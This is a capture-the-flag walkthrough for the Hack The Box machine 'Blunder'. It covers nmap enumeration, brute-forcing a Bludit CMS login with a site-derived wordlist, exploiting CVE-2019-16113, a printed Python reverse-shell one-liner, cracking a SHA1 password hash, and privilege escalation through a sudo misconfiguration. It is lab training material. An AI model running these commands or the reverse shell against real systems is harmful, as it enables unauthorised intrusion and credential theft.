# Blunder

## Enumaration

NMAP

> nmap -sC -sS -sV -O -A -v -v 10.10.10.191

(i use zenmap)

![image](https://user-images.githubusercontent.com/53917092/94874037-430b9400-0427-11eb-9578-8afa34aff886.png)

output :

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 19:15 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Initiating Ping Scan at 19:15
Scanning 10.10.10.191 [4 ports]
Completed Ping Scan at 19:15, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:15
Completed Parallel DNS resolution of 1 host. at 19:15, 0.01s elapsed
Initiating SYN Stealth Scan at 19:15
Scanning 10.10.10.191 [1000 ports]
Discovered open port 80/tcp on 10.10.10.191
Completed SYN Stealth Scan at 19:16, 10.78s elapsed (1000 total ports)
Initiating Service scan at 19:16
Scanning 1 service on 10.10.10.191
Completed Service scan at 19:16, 6.38s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.10.191
Retrying OS detection (try #2) against 10.10.10.191
Initiating Traceroute at 19:16
Completed Traceroute at 19:16, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:16
Completed Parallel DNS resolution of 2 hosts. at 19:16, 0.01s elapsed
NSE: Script scanning 10.10.10.191.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 3.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 0.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 0.00s elapsed
Nmap scan report for 10.10.10.191
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2020-10-01 19:15:54 EDT for 26s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE  SERVICE REASON         VERSION
21/tcp closed ftp     reset ttl 63
80/tcp open   http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=10/1%OT=80%CT=21%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F766344%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 43.261 days (since Wed Aug 19 12:59:56 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   155.47 ms 10.10.14.1
2   155.63 ms 10.10.10.191

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:16
Completed NSE at 19:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
           Raw packets sent: 2074 (94.652KB) | Rcvd: 44 (2.548KB)
```

let's check the website (apache2 running on port 80)


![image](https://user-images.githubusercontent.com/53917092/94908306-dbca0000-0477-11eb-86b0-3344ea6c0187.png)

apparently is a site about interesting facts

looking the page source code we will have :

![image](https://user-images.githubusercontent.com/53917092/94908933-c5707400-0478-11eb-8486-a10699c717da.png)

and this caught my attention :

![image](https://user-images.githubusercontent.com/53917092/94909079-01a3d480-0479-11eb-8c15-6d81d2c6bce1.png)

we know the version is 3.9.2, but we need to find out which is the CMS

for a better enumeration we will try to find more directories and files, for this I will use the tool called dirbuster

![image](https://user-images.githubusercontent.com/53917092/94910348-0073a700-047b-11eb-9803-36673c0db879.png)

so i found:

![image](https://user-images.githubusercontent.com/53917092/94910479-239e5680-047b-11eb-924d-6c52f1df65bb.png)

searching over this structure I found :

![image](https://user-images.githubusercontent.com/53917092/94910942-c9ea5c00-047b-11eb-8b4a-8e779842f1ca.png)

ok, the site is made in bludit 3.9.2

![image](https://user-images.githubusercontent.com/53917092/94911550-b2f83980-047c-11eb-929c-a93283949f78.png)

let's use this exploit from CVE-2019-16113

### BUT

this exploit needs the user and password, which we do not know

so let's find out

for this, we can use :

![image](https://user-images.githubusercontent.com/53917092/94912365-eedfce80-047d-11eb-815d-b71854bbe5ee.png)

code:

https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/blob/master/bruteforce.py

this code takes a wordlist and tests all the words to find the password

but, we still need the user...

we return to the enumeration stage

![image](https://user-images.githubusercontent.com/53917092/94913410-9e697080-047f-11eb-86d7-b3e44669c660.png)

again in the Dirbuster, we see this file that seems interesting

![image](https://user-images.githubusercontent.com/53917092/94913801-4121ef00-0480-11eb-9699-fee431f23d1b.png)

now we know that there is a user called fergus

now let's test the passwords

but to generate a list of passwords that makes sense, I will use a tool called "cewl", which takes the words of a site and assembles a list

> cewl 10.10.10.191 -w wordlist.txt

![image](https://user-images.githubusercontent.com/53917092/94914325-3451cb00-0481-11eb-9ef1-0181e9c90e33.png)

now let's use that code to find out the password

> python3 10.10.191 fergus wordlist.txt

![image](https://user-images.githubusercontent.com/53917092/94914692-dffb1b00-0481-11eb-96db-6113f67f0615.png)

![image](https://user-images.githubusercontent.com/53917092/94915471-58161080-0483-11eb-8a9a-346f0e508273.png)

finally, we have the password, now use the exploit from CVE-2019-16113

## Getting Shell

![image](https://user-images.githubusercontent.com/53917092/94916228-abd52980-0484-11eb-80eb-692e4106b982.png)

![image](https://user-images.githubusercontent.com/53917092/94916325-e0e17c00-0484-11eb-9363-25d8843cd081.png)

![image](https://user-images.githubusercontent.com/53917092/94916508-2b62f880-0485-11eb-974e-a2c2eed20340.png)

![image](https://user-images.githubusercontent.com/53917092/94916617-65cc9580-0485-11eb-936c-f74dfa19cff5.png)

now we have a shell, but very bad

### improving this shell

to improve this shell, we will make this connection start another shell, for this we will use :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
(changing the ip)

![image](https://user-images.githubusercontent.com/53917092/94917382-d0320580-0486-11eb-9539-88e8bd9e5e22.png)

(on the right screen we have the good shell, but not a tty)

to have a tty, run the command :

> python -c 'import pty;pty.spawn("/bin/bash")'

now we have to try to get access to some user (www-data dont have acess to the user flag)

looking for files in the www-data, I found 
> /var/www/bludit-3.10.0a/bl-content/databases/users.php

![image](https://user-images.githubusercontent.com/53917092/94918936-ebeadb00-0489-11eb-98e1-24c1badcff20.png)

here we see the user (hugo) and the encrypted password

now let's break the password encryption

we need to find out which encryption was used

for this I will use a site called tunnelsup

https://www.tunnelsup.com/hash-analyzer/

![image](https://user-images.githubusercontent.com/53917092/94919144-57cd4380-048a-11eb-8dc3-59600f1b87bc.png)

breaking ( https://www.dcode.fr/sha1-hash ) :

![image](https://user-images.githubusercontent.com/53917092/94919344-b85c8080-048a-11eb-8135-c83bce488770.png)

now we have the password, let's change our user

![image](https://user-images.githubusercontent.com/53917092/94919514-fb1e5880-048a-11eb-8a0d-1b0de989c0ea.png)

## Privilege Escalation

to see the privileged escalation vectors I'll use the script called Linpeas, to put it on the machine, I'll download it on my pc, put it on a server and on the machine I'll download it using the command wget

![image](https://user-images.githubusercontent.com/53917092/94920985-c069ef80-048d-11eb-8ad8-2490c9c6ccdc.png)

giving permission and running

![image](https://user-images.githubusercontent.com/53917092/94921338-8816e100-048e-11eb-8abd-4b9701ac6e5e.png)

we see that the hugo user can use the command "(ALL, !root) /bin/bash"

![image](https://user-images.githubusercontent.com/53917092/94922359-733b4d00-0490-11eb-8c19-83c49b05512b.png)

searching for about this, we see that there is an exploit to escalate the privilege

![image](https://user-images.githubusercontent.com/53917092/94922594-e47b0000-0490-11eb-87dd-578465479847.png)

Let's use it

I will download the script in the same way I did before with the linpeas

![image](https://user-images.githubusercontent.com/53917092/94922852-49cef100-0491-11eb-86b7-8a5b96b3ff7e.png)

now we are root, just catch the flag.

![image](https://user-images.githubusercontent.com/53917092/94922938-6ec36400-0491-11eb-9a63-c5b123fe0a4d.png)
